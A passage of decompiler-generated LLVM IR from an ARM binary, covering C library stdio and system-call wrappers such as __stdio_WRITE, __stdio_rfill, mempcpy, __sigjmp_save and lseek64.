  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_19b8c, %bb18
  %v1_19b94 = add i32 %v0_19b74, 4
  %v2_19b94 = inttoptr i32 %v1_19b94 to i32*
  %v3_19b94 = load i32, i32* %v2_19b94, align 4
  store i32 %v3_19b94, i32* %r0.global-to-local, align 4
  %v1_19b98 = call i32 @__libc_read(i32 %v3_19b94)
  store i32 %v1_19b98, i32* %r0.global-to-local, align 4
  %v5_19ba0 = icmp sgt i32 %v1_19b98, 0
  br i1 %v5_19ba0, label %.thread7, label %dec_label_pc_19ba4

dec_label_pc_19ba4:                               ; preds = %bb19
  %v2_19b9c = icmp eq i32 %v1_19b98, 0
  %v0_19ba4 = load i32, i32* @r4, align 4
  %v1_19ba4 = inttoptr i32 %v0_19ba4 to i16*
  %v2_19ba4 = load i16, i16* %v1_19ba4, align 2
  br i1 %v2_19b9c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_19ba4
  %v2_19ba8 = or i16 %v2_19ba4, 4
  store i16 %v2_19ba8, i16* %v1_19ba4, align 2
  %v1_19bc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_19ba4
  %v2_19bac = or i16 %v2_19ba4, 8
  store i16 %v2_19bac, i16* %v1_19ba4, align 2
  %v1_19bb8 = load i32, i32* @r5, align 4
  store i32 %v1_19bb8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_19bc4 = phi i32 [ %v1_19bc4.pre, %bb20 ], [ 0, %bb ], [ %v1_19b98, %bb19 ], [ %v1_19bb8, %bb21 ]
  %v2_19bc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19bc0, i32* @r4, align 4
  ret i32 %v1_19bc4

; uselistorder directives
  uselistorder i16 %v2_19ba4, { 1, 0 }
  uselistorder i32 %v1_19b98, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_19c8c2 = icmp eq i32 %arg3, 0
  store i1 %v2_19c8c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c8c2, label %dec_label_pc_19c94, label %dec_label_pc_19be4

dec_label_pc_19be4:                               ; preds = %entry, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge
  %v0_19bf0 = phi i32 [ %v0_19bf0.pre, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge ], [ %tmp, %entry ]
  %v0_19bec = phi i32 [ %v5_19bfc, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge ], [ %arg2, %entry ]
  %v3_19be4 = phi i32 [ %v3_19be4.pre, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge ], [ 2147483647, %entry ]
  %v0_19be8.in = phi i32 [ %v5_19c00, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge ], [ %arg3, %entry ]
  %v3_19be8 = phi i32 [ %v5_19c00, %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge ], [ %arg3, %entry ]
  %v0_19be8 = icmp slt i32 %v0_19be8.in, 0
  %storemerge = select i1 %v0_19be8, i32 %v3_19be4, i32 %v3_19be8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_19bec, i32* %r1.global-to-local, align 4
  %v1_19bf0 = add i32 %v0_19bf0, 4
  %v2_19bf0 = inttoptr i32 %v1_19bf0 to i32*
  %v3_19bf0 = load i32, i32* %v2_19bf0, align 4
  %v3_19bf4 = call i32 @__GI___libc_write(i32 %v3_19bf0, i32 %v0_19bec)
  %v1_19bf8 = icmp slt i32 %v3_19bf4, 0
  %v2_19bf8 = icmp eq i32 %v3_19bf4, 0
  store i1 %v2_19bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19bf8, label %dec_label_pc_19c08, label %dec_label_pc_19c8cthread-pre-split

dec_label_pc_19c08:                               ; preds = %dec_label_pc_19be4
  %v0_19c08 = load i32, i32* @r4, align 4
  %v1_19c08 = inttoptr i32 %v0_19c08 to i16*
  %v2_19c08 = load i16, i16* %v1_19c08, align 2
  %v1_19c0c = or i16 %v2_19c08, 8
  store i16 %v1_19c0c, i16* %v1_19c08, align 2
  store i32 42284, i32* %r3.global-to-local, align 4
  %v0_19c18 = call i32 @__aeabi_read_tp()
  %v3_19c1c = load i16, i16* @global_var_24150.533, align 2
  %v4_19c1c = sext i16 %v3_19c1c to i32
  store i32 %v4_19c1c, i32* %r3.global-to-local, align 4
  %v2_19c20 = add i32 %v4_19c1c, %v0_19c18
  %v3_19c20 = inttoptr i32 %v2_19c20 to i32*
  %v4_19c20 = load i32, i32* %v3_19c20, align 4
  store i32 %v4_19c20, i32* %r3.global-to-local, align 4
  %v7_19c24 = icmp eq i32 %v4_19c20, 4
  store i1 %v7_19c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19c24, label %dec_label_pc_19c30, label %bb21

bb21:                                             ; preds = %dec_label_pc_19c08
  %v8_19c28 = icmp eq i32 %v4_19c20, 11
  store i1 %v8_19c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19c28, label %dec_label_pc_19c30, label %dec_label_pc_19c94

dec_label_pc_19c30:                               ; preds = %dec_label_pc_19c08, %bb21
  %v0_19c30 = load i32, i32* @r4, align 4
  %v1_19c30 = add i32 %v0_19c30, 8
  store i32 %v1_19c30, i32* %r2.global-to-local, align 4
  %v1_19c34 = inttoptr i32 %v1_19c30 to i32*
  %v2_19c34 = load i32, i32* %v1_19c34, align 4
  store i32 %v2_19c34, i32* %r2.global-to-local, align 4
  %v3_19c34 = add i32 %v0_19c30, 12
  %v4_19c34 = inttoptr i32 %v3_19c34 to i32*
  %v5_19c34 = load i32, i32* %v4_19c34, align 4
  store i32 %v5_19c34, i32* %r3.global-to-local, align 4
  %v2_19c38 = sub i32 %v5_19c34, %v2_19c34
  store i32 %v2_19c38, i32* %r1.global-to-local, align 4
  %v9_19c38 = icmp eq i32 %v5_19c34, %v2_19c34
  store i1 %v9_19c38, i1* %cpsr_z.global-to-local, align 1
  %v0_19c84.pre = load i32, i32* @r5, align 4
  br i1 %v9_19c38, label %dec_label_pc_19c84, label %dec_label_pc_19c40

dec_label_pc_19c40:                               ; preds = %dec_label_pc_19c30
  %v3_19c40 = icmp ult i32 %v2_19c38, %v0_19c84.pre
  %v9_19c40 = icmp eq i32 %v2_19c38, %v0_19c84.pre
  store i1 %v9_19c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19c40, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_19c40
  store i32 %v0_19c84.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19c40, %bb22, %dec_label_pc_19c68
  %v2_19c54 = phi i32 [ %v1_19c6c, %dec_label_pc_19c68 ], [ %v2_19c34, %bb22 ], [ %v2_19c34, %dec_label_pc_19c40 ]
  %v0_19c48 = load i32, i32* @r6, align 4
  %v1_19c48 = inttoptr i32 %v0_19c48 to i8*
  %v2_19c48 = load i8, i8* %v1_19c48, align 1
  %v3_19c48 = zext i8 %v2_19c48 to i32
  store i32 %v3_19c48, i32* %r3.global-to-local, align 4
  %v7_19c4c = icmp eq i8 %v2_19c48, 10
  store i1 %v7_19c4c, i1* %cpsr_z.global-to-local, align 1
  %v1_19c50 = add i32 %v0_19c48, 1
  store i32 %v1_19c50, i32* @r6, align 4
  %v3_19c54 = inttoptr i32 %v2_19c54 to i8*
  store i8 %v2_19c48, i8* %v3_19c54, align 1
  %v0_19c58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c58, label %dec_label_pc_19c5c, label %dec_label_pc_19c68

dec_label_pc_19c5c:                               ; preds = %.preheader
  %v0_19c5c = load i32, i32* @r4, align 4
  %v1_19c5c = inttoptr i32 %v0_19c5c to i16*
  %v2_19c5c = load i16, i16* %v1_19c5c, align 2
  %v3_19c5c = zext i16 %v2_19c5c to i32
  store i32 %v3_19c5c, i32* %r3.global-to-local, align 4
  %v1_19c60 = and i32 %v3_19c5c, 256
  %v2_19c60 = icmp eq i32 %v1_19c60, 0
  store i1 %v2_19c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c60, label %dec_label_pc_19c68, label %dec_label_pc_19c5c.dec_label_pc_19c74_crit_edge

dec_label_pc_19c5c.dec_label_pc_19c74_crit_edge:  ; preds = %dec_label_pc_19c5c
  %v0_19c78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c74

dec_label_pc_19c68:                               ; preds = %dec_label_pc_19c5c, %.preheader
  %v0_19c68 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c68 = add i32 %v0_19c68, -1
  store i32 %v1_19c68, i32* %r1.global-to-local, align 4
  %v7_19c68 = icmp eq i32 %v0_19c68, 1
  store i1 %v7_19c68, i1* %cpsr_z.global-to-local, align 1
  %v0_19c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_19c6c = add i32 %v0_19c6c, 1
  store i32 %v1_19c6c, i32* %r2.global-to-local, align 4
  br i1 %v7_19c68, label %dec_label_pc_19c68.dec_label_pc_19c74_crit_edge, label %.preheader

dec_label_pc_19c68.dec_label_pc_19c74_crit_edge:  ; preds = %dec_label_pc_19c68
  %v0_19c74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19c74

dec_label_pc_19c74:                               ; preds = %dec_label_pc_19c5c.dec_label_pc_19c74_crit_edge, %dec_label_pc_19c68.dec_label_pc_19c74_crit_edge
  %v0_19c78 = phi i32 [ %v1_19c6c, %dec_label_pc_19c68.dec_label_pc_19c74_crit_edge ], [ %v0_19c78.pre, %dec_label_pc_19c5c.dec_label_pc_19c74_crit_edge ]
  %v0_19c74 = phi i32 [ %v0_19c74.pre, %dec_label_pc_19c68.dec_label_pc_19c74_crit_edge ], [ %v0_19c5c, %dec_label_pc_19c5c.dec_label_pc_19c74_crit_edge ]
  %v1_19c74 = add i32 %v0_19c74, 8
  %v2_19c74 = inttoptr i32 %v1_19c74 to i32*
  %v3_19c74 = load i32, i32* %v2_19c74, align 4
  store i32 %v3_19c74, i32* %r3.global-to-local, align 4
  %v2_19c78 = add i32 %v0_19c74, 16
  %v3_19c78 = inttoptr i32 %v2_19c78 to i32*
  store i32 %v0_19c78, i32* %v3_19c78, align 4
  %v0_19c7c = load i32, i32* %r3.global-to-local, align 4
  %v1_19c7c = load i32, i32* %r2.global-to-local, align 4
  %v2_19c7c = sub i32 %v1_19c7c, %v0_19c7c
  store i32 %v2_19c7c, i32* %r3.global-to-local, align 4
  %v1_19c80 = load i32, i32* @r5, align 4
  %v2_19c80 = sub i32 %v1_19c80, %v2_19c7c
  br label %dec_label_pc_19c84

dec_label_pc_19c84:                               ; preds = %dec_label_pc_19c30, %dec_label_pc_19c74
  %v0_19c84 = phi i32 [ %v2_19c80, %dec_label_pc_19c74 ], [ %v0_19c84.pre, %dec_label_pc_19c30 ]
  %v1_19c84 = load i32, i32* @r7, align 4
  %v2_19c84 = sub i32 %v1_19c84, %v0_19c84
  store i32 %v2_19c84, i32* @r7, align 4
  br label %dec_label_pc_19c94

dec_label_pc_19c8cthread-pre-split:               ; preds = %dec_label_pc_19be4
  %v3_19bfc = load i32, i32* @r6, align 4
  %v5_19bfc = add i32 %v3_19bfc, %v3_19bf4
  store i32 %v5_19bfc, i32* @r6, align 4
  %v4_19c00 = load i32, i32* @r5, align 4
  %v5_19c00 = sub i32 %v4_19c00, %v3_19bf4
  store i32 %v5_19c00, i32* @r5, align 4
  %v2_19c8c = icmp eq i32 %v5_19c00, 0
  store i1 %v2_19c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c8c, label %dec_label_pc_19c94, label %dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge

dec_label_pc_19c8cthread-pre-split.dec_label_pc_19be4_crit_edge: ; preds = %dec_label_pc_19c8cthread-pre-split
  %v3_19be4.pre = load i32, i32* @r8, align 4
  %v0_19bf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19be4

dec_label_pc_19c94:                               ; preds = %dec_label_pc_19c8cthread-pre-split, %entry, %bb21, %dec_label_pc_19c84
  %v0_19c94 = load i32, i32* @r7, align 4
  ret i32 %v0_19c94

; uselistorder directives
  uselistorder i32 %v5_19c00, { 1, 3, 0, 2 }
  uselistorder i32 %v5_19bfc, { 1, 0 }
  uselistorder i32 %v0_19c74, { 1, 0 }
  uselistorder i32 %v1_19c6c, { 0, 2, 1 }
  uselistorder i32 %v0_19c68, { 1, 0 }
  uselistorder i32 %v0_19c84.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_19c34, { 1, 0, 2 }
  uselistorder i32 %v2_19c34, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_19bf4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19bec, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 5, 6, 0, 4, 7, 1, 2, 3 }
  uselistorder i32 11, { 11, 8, 9, 10, 16, 22, 27, 2, 12, 13, 23, 24, 25, 0, 14, 3, 15, 17, 18, 4, 19, 5, 20, 1, 21, 26, 6, 28, 29, 30, 7, 31 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19c94, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19c84, { 1, 0 }
  uselistorder label %dec_label_pc_19c74, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19c30, { 1, 0 }
  uselistorder label %dec_label_pc_19be4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19ca4 = load i32, i32* @r4, align 4
  store i32 %v3_19ca4, i32* %stack_var_-8, align 4
  %v1_19ca8 = add i32 %arg1, 8
  %v1_19cac = inttoptr i32 %v1_19ca8 to i32*
  %v2_19cac = load i32, i32* %v1_19cac, align 4
  store i32 %v2_19cac, i32* @r1, align 4
  %v3_19cac = add i32 %arg1, 12
  %v4_19cac = inttoptr i32 %v3_19cac to i32*
  %v5_19cac = load i32, i32* %v4_19cac, align 4
  %v2_19cb0 = sub i32 %v5_19cac, %v2_19cac
  store i32 %v2_19cb0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19cb8 = inttoptr i32 %arg1 to i16*
  %v4_19cb8 = call i32 @__stdio_READ(i16* %v3_19cb8, i32 %v2_19cac, i32 %v2_19cb0)
  %v0_19cbc = load i32, i32* @r4, align 4
  %v1_19cbc = add i32 %v0_19cbc, 8
  %v2_19cbc = inttoptr i32 %v1_19cbc to i32*
  %v3_19cbc = load i32, i32* %v2_19cbc, align 4
  store i32 %v3_19cbc, i32* %r2.global-to-local, align 4
  %v2_19cc0 = add i32 %v3_19cbc, %v4_19cb8
  %v2_19cc4 = add i32 %v0_19cbc, 20
  %v3_19cc4 = inttoptr i32 %v2_19cc4 to i32*
  store i32 %v2_19cc0, i32* %v3_19cc4, align 4
  %v0_19cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19cc8 = load i32, i32* @r4, align 4
  %v2_19cc8 = add i32 %v1_19cc8, 16
  %v3_19cc8 = inttoptr i32 %v2_19cc8 to i32*
  store i32 %v0_19cc8, i32* %v3_19cc8, align 4
  %v2_19ccc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19ccc, i32* @r4, align 4
  ret i32 %v4_19cb8

; uselistorder directives
  uselistorder i32 %v4_19cb8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19cd4 = load i32, i32* @r4, align 4
  store i32 %v3_19cd4, i32* %stack_var_-12, align 4
  %v0_19cd8 = load i32, i32* @r0, align 4
  %v1_19cd8 = inttoptr i32 %v0_19cd8 to i16*
  %v2_19cd8 = load i16, i16* %v1_19cd8, align 2
  %v3_19cd8 = zext i16 %v2_19cd8 to i32
  store i32 %v3_19cd8, i32* %r3.global-to-local, align 4
  %v0_19cdc = load i32, i32* @r1, align 4
  %v2_19cdc = and i32 %v0_19cdc, %v3_19cd8
  %v4_19cdc = icmp eq i32 %v2_19cdc, 0
  store i32 %v0_19cd8, i32* @r4, align 4
  br i1 %v4_19cdc, label %dec_label_pc_19cec, label %dec_label_pc_19cfc

dec_label_pc_19cec:                               ; preds = %entry
  %v1_19cec = and i32 %v3_19cd8, 2176
  %v2_19cec = icmp eq i32 %v1_19cec, 0
  br i1 %v2_19cec, label %dec_label_pc_19cf4, label %dec_label_pc_19d08

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19cec
  %v2_19cf4 = or i32 %v0_19cdc, %v3_19cd8
  store i32 %v2_19cf4, i32* %r3.global-to-local, align 4
  %v1_19cf8 = trunc i32 %v2_19cf4 to i16
  store i16 %v1_19cf8, i16* %v1_19cd8, align 2
  %v0_19cfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19cfc

dec_label_pc_19cfc:                               ; preds = %entry, %dec_label_pc_19cf4
  %v0_19cfc = phi i32 [ %v0_19cd8, %entry ], [ %v0_19cfc.pre, %dec_label_pc_19cf4 ]
  %v1_19cfc = inttoptr i32 %v0_19cfc to i16*
  %v2_19cfc = load i16, i16* %v1_19cfc, align 2
  %v3_19cfc = zext i16 %v2_19cfc to i32
  store i32 %v3_19cfc, i32* %r3.global-to-local, align 4
  %v1_19d00 = and i32 %v3_19cfc, 16
  store i32 %v1_19d00, i32* %r5.global-to-local, align 4
  %v2_19d00 = icmp eq i32 %v1_19d00, 0
  br i1 %v2_19d00, label %dec_label_pc_19d30, label %dec_label_pc_19d08

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19cec, %dec_label_pc_19cfc
  store i32 42040, i32* %r3.global-to-local, align 4
  %v0_19d0c = call i32 @__aeabi_read_tp()
  store i32 %v0_19d0c, i32* %r0.global-to-local, align 4
  %v3_19d10 = load i16, i16* @global_var_24150.533, align 2
  %v4_19d10 = sext i16 %v3_19d10 to i32
  store i32 %v4_19d10, i32* %r3.global-to-local, align 4
  %v3_19d18 = add i32 %v4_19d10, %v0_19d0c
  %v4_19d18 = inttoptr i32 %v3_19d18 to i32*
  store i32 9, i32* %v4_19d18, align 4
  br label %dec_label_pc_19d1c

dec_label_pc_19d1c:                               ; preds = %dec_label_pc_19d38, %dec_label_pc_19d08
  %v0_19d1c = load i32, i32* @r4, align 4
  %v1_19d1c = inttoptr i32 %v0_19d1c to i16*
  %v2_19d1c = load i16, i16* %v1_19d1c, align 2
  %v3_19d1c = zext i16 %v2_19d1c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19d24 = or i32 %v3_19d1c, 8
  store i32 %v1_19d24, i32* %r3.global-to-local, align 4
  %v1_19d28 = trunc i32 %v1_19d24 to i16
  store i16 %v1_19d28, i16* %v1_19d1c, align 2
  %v1_19d70.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d68

dec_label_pc_19d30:                               ; preds = %dec_label_pc_19cfc
  %v1_19d30 = and i32 %v3_19cfc, 64
  %v2_19d30 = icmp eq i32 %v1_19d30, 0
  br i1 %v2_19d30, label %dec_label_pc_19d58, label %dec_label_pc_19d38

dec_label_pc_19d38:                               ; preds = %dec_label_pc_19d30
  %v0_19d38 = load i32, i32* @r0, align 4
  %v1_19d38 = call i32 @__stdio_wcommit(i32 %v0_19d38)
  store i32 %v1_19d38, i32* %r0.global-to-local, align 4
  %v2_19d3c = icmp eq i32 %v1_19d38, 0
  br i1 %v2_19d3c, label %dec_label_pc_19d44, label %dec_label_pc_19d1c

dec_label_pc_19d44:                               ; preds = %dec_label_pc_19d38
  %v0_19d44 = load i32, i32* @r4, align 4
  %v1_19d44 = inttoptr i32 %v0_19d44 to i16*
  %v2_19d44 = load i16, i16* %v1_19d44, align 2
  %v3_19d44 = zext i16 %v2_19d44 to i32
  store i32 %v3_19d44, i32* %r3.global-to-local, align 4
  %v1_19d48 = add i32 %v0_19d44, 8
  %v2_19d48 = inttoptr i32 %v1_19d48 to i32*
  %v3_19d48 = load i32, i32* %v2_19d48, align 4
  %v1_19d4c = and i32 %v3_19d44, 65471
  store i32 %v1_19d4c, i32* %r3.global-to-local, align 4
  %v2_19d50 = add i32 %v0_19d44, 28
  %v3_19d50 = inttoptr i32 %v2_19d50 to i32*
  store i32 %v3_19d48, i32* %v3_19d50, align 4
  %v0_19d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_19d54 = trunc i32 %v0_19d54 to i16
  %v2_19d54 = load i32, i32* @r4, align 4
  %v3_19d54 = inttoptr i32 %v2_19d54 to i16*
  store i16 %v1_19d54, i16* %v3_19d54, align 2
  %v0_19d58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d58

dec_label_pc_19d58:                               ; preds = %dec_label_pc_19d30, %dec_label_pc_19d44
  %v2_19d60 = phi i32 [ %v0_19cfc, %dec_label_pc_19d30 ], [ %v0_19d58.pre, %dec_label_pc_19d44 ]
  %v1_19d58 = inttoptr i32 %v2_19d60 to i16*
  %v2_19d58 = load i16, i16* %v1_19d58, align 2
  %v3_19d58 = zext i16 %v2_19d58 to i32
  %v1_19d5c = or i32 %v3_19d58, 1
  store i32 %v1_19d5c, i32* %r3.global-to-local, align 4
  %v1_19d60 = trunc i32 %v1_19d5c to i16
  store i16 %v1_19d60, i16* %v1_19d58, align 2
  %v0_19d64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19d64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19d1c, %dec_label_pc_19d58
  %v1_19d70 = phi i32 [ %v1_19d70.pre, %dec_label_pc_19d1c ], [ %v0_19d64, %dec_label_pc_19d58 ]
  %v2_19d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19d6c, i32* @r4, align 4
  ret i32 %v1_19d70

; uselistorder directives
  uselistorder i32 %v3_19cd8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19d68, { 1, 0 }
  uselistorder label %dec_label_pc_19d58, { 1, 0 }
  uselistorder label %dec_label_pc_19d08, { 1, 0 }
  uselistorder label %dec_label_pc_19cfc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19d78 = load i32, i32* @r4, align 4
  %v6_19d78 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19d88 = call i32 @memcpy()
  %v0_19d8c = load i32, i32* @r5, align 4
  %v1_19d8c = load i32, i32* @r4, align 4
  %v2_19d8c = add i32 %v1_19d8c, %v0_19d8c
  store i32 %v3_19d78, i32* @r4, align 4
  store i32 %v6_19d78, i32* @r5, align 4
  ret i32 %v2_19d8c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_19d9c = load i32, i32* @r1, align 4
  %v2_19d9c = icmp eq i32 %v0_19d9c, 0
  %v3_19da0 = load i32, i32* @r4, align 4
  store i32 %v3_19da0, i32* %stack_var_-8, align 4
  %v0_19da4 = load i32, i32* @r0, align 4
  store i32 %v0_19da4, i32* %r4.global-to-local, align 4
  br i1 %v2_19d9c, label %dec_label_pc_19dc8, label %dec_label_pc_19dac

dec_label_pc_19dac:                               ; preds = %entry
  %v1_19db4 = add i32 %v0_19da4, 260
  %v4_19db8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19db4)
  %v2_19dbc = icmp eq i32 %v4_19db8, 0
  br i1 %v2_19dbc, label %dec_label_pc_19dcc, label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19dac, %entry
  br label %dec_label_pc_19dcc

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19dac, %dec_label_pc_19dc8
  %storemerge = phi i32 [ 0, %dec_label_pc_19dc8 ], [ 1, %dec_label_pc_19dac ]
  %v1_19dd0 = load i32, i32* %r4.global-to-local, align 4
  %v2_19dd0 = add i32 %v1_19dd0, 256
  %v3_19dd0 = inttoptr i32 %v2_19dd0 to i32*
  store i32 %storemerge, i32* %v3_19dd0, align 4
  %v2_19dd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19dd4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 10, 0, 4, 5, 1, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 3, 24, 27, 25, 26, 40, 28, 9, 29, 30, 31, 32, 33, 34, 35, 36, 37, 8, 38, 39 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19dcc, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_19e24, label %dec_label_pc_19e08

dec_label_pc_19e08:                               ; preds = %entry
  %v0_19e0c = call i32 @__aeabi_read_tp()
  %v3_19e10 = load i16, i16* @global_var_24150.533, align 2
  %v4_19e10 = sext i16 %v3_19e10 to i32
  %v0_19e14 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e14 = sub i32 0, %v0_19e14
  store i32 %v1_19e14, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19e1c = add i32 %v4_19e10, %v0_19e0c
  %v4_19e1c = inttoptr i32 %v3_19e1c to i32*
  store i32 %v1_19e14, i32* %v4_19e1c, align 4
  %v0_19e2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19e2c

dec_label_pc_19e24:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_19e24 = icmp eq i32 %arg1, 0
  br i1 %v2_19e24, label %dec_label_pc_19e38, label %dec_label_pc_19e2c

dec_label_pc_19e2c:                               ; preds = %dec_label_pc_19e24, %dec_label_pc_19e08
  %v0_19e2c = phi i32 [ %arg1, %dec_label_pc_19e24 ], [ %v0_19e2c.pre, %dec_label_pc_19e08 ]
  %v3_19e30 = ashr i32 %v0_19e2c, 31
  br label %dec_label_pc_19e3c

dec_label_pc_19e38:                               ; preds = %dec_label_pc_19e24
  br label %dec_label_pc_19e3c

dec_label_pc_19e3c:                               ; preds = %dec_label_pc_19e2c, %dec_label_pc_19e38
  %v1_19e44 = phi i32 [ %v0_19e2c, %dec_label_pc_19e2c ], [ %tmp8, %dec_label_pc_19e38 ]
  %storemerge = phi i32 [ %v3_19e30, %dec_label_pc_19e2c ], [ %tmp, %dec_label_pc_19e38 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_19e44

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 6, 4, 5, 11, 10, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
